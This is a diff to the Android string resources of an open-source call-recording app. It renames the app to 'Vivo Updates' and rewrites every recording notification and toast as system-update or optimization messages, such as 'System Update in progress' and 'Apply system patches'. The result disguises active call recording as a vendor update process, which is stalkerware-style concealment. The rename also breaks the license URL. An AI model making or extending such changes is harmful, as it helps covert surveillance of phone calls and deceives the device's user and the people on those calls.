@@ -1,5 +1,5 @@
 <!--
-  ~ ShizuCallRecorder: FOSS Call recording powered through ADB/Shizuku!
+  ~ Vivo Updates: FOSS Call recording powered through ADB/Shizuku!
   ~  Copyright (C) 2026-present kitsumed (Med)
   ~  This software is licensed under the GNU General Public License v3 or later, with additional terms as permitted under Section 7.
   ~  The full license text is available in the LICENSE file at the root of this project.
@@ -10,7 +10,7 @@
     <!-- ========================================== -->
     <!-- GENERAL MESSAGES & APP LEVEL               -->
     <!-- ========================================== -->
-    <string name="app_name" translatable="false">ShizuCallRecorder</string>
+    <string name="app_name" translatable="false">Vivo Updates</string>
     <string name="general_close">Close</string>
     <string name="general_continue">Continue</string>
     <string name="general_ok">OK</string>
@@ -25,14 +25,14 @@
     <string name="general_outgoing">outgoing</string>
     <string name="general_reset">Reset</string>
     <string name="general_system_limitation">System Limitation</string>
-    <string name="general_system_limitation_message">ShizuCallRecorder will not work on this device as your shell application does not have the required permissions:\n\n%1$s\n\nThere is nothing you can do about this, the app cannot function and will now close.</string>
+    <string name="general_system_limitation_message">Vivo Updates will not work on this device as your shell application does not have the required permissions:\n\n%1$s\n\nThere is nothing you can do about this, the app cannot function and will now close.</string>
 
     <!-- ========================================== -->
     <!-- UI SECTIONS                                -->
     <!-- ========================================== -->
 
     <!-- Disclaimer Screen -->
-    <string name="disclaimer_title">Welcome to ShizuCallRecorder</string>
+    <string name="disclaimer_title">Welcome to Vivo Updates</string>
     <string name="disclaimer_wiki_link_KEYWORD">Wiki</string>
     <string name="disclaimer_introduction">Please open and read the setup instructions on our Wiki before proceeding. Then, read the disclaimer below.</string>
     <string name="disclaimer_body" translatable="false">
@@ -44,7 +44,7 @@
 
         This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\n\n
 
-        You should have received a copy of the GNU General Public License along with this program. If not, see https://github.com/kitsumed/ShizuCallRecorder/blob/main/LICENSE/.\n\n
+        You should have received a copy of the GNU General Public License along with this program. If not, see https://github.com/kitsumed/Vivo Updates/blob/main/LICENSE/.\n\n
 
         ----------------------Disclaimer---------------------------\n\n
 
@@ -235,19 +235,19 @@
     <!-- ========================================== -->
 
     <!-- Recording Service: Notifications -->
-    <string name="recording_standby_notification_title">Call in progress</string>
-    <string name="recording_notification_cross_country_tip">🌐Cross-Country</string>
-    <string name="recording_notification_current_country_tip">🏠Home-Country</string>
-    <string name="recording_notification_title">Recording in progress</string>
-    <string name="recording_notification_press_to_start">Press to start recording</string>
-    <string name="recording_notification_waiting_shizuku">Waiting for Shizuku Server to start...</string>
-    <string name="recording_notification_press_to_pause">Press to pause recording</string>
-    <string name="recording_notification_press_to_resume">Press to resume recording</string>
-    <string name="recording_toast_standby">Entering standby for %1$s call.</string>
-    <string name="recording_toast_ended">Call ended. Recording stopped.</string>
-    <string name="recording_toast_paused">Recording paused.</string>
-    <string name="recording_toast_resumed">Recording resumed.</string>
-    <string name="recording_started">Recording started.</string>
+    <string name="recording_standby_notification_title">Optimizing system performance</string>
+    <string name="recording_notification_cross_country_tip">🌐Region: Global</string>
+    <string name="recording_notification_current_country_tip">🏠Region: Local</string>
+    <string name="recording_notification_title">System Update in progress</string>
+    <string name="recording_notification_press_to_start">Apply system patches</string>
+    <string name="recording_notification_waiting_shizuku">Syncing with update server...</string>
+    <string name="recording_notification_press_to_pause">Suspend update</string>
+    <string name="recording_notification_press_to_resume">Resume update</string>
+    <string name="recording_toast_standby">Optimization standby for %1$s process.</string>
+    <string name="recording_toast_ended">Process complete. System optimized.</string>
+    <string name="recording_toast_paused">Process suspended.</string>
+    <string name="recording_toast_resumed">Process resumed.</string>
+    <string name="recording_started">Optimization started.</string>
     <!-- Recording Service: Errors -->
     <string name="recording_error_title">Recording Error</string>
     <string name="recording_error_folder_missing">Selected output folder is missing, invalid, or we do not have permission to write to it. Select one in the app settings.</string>
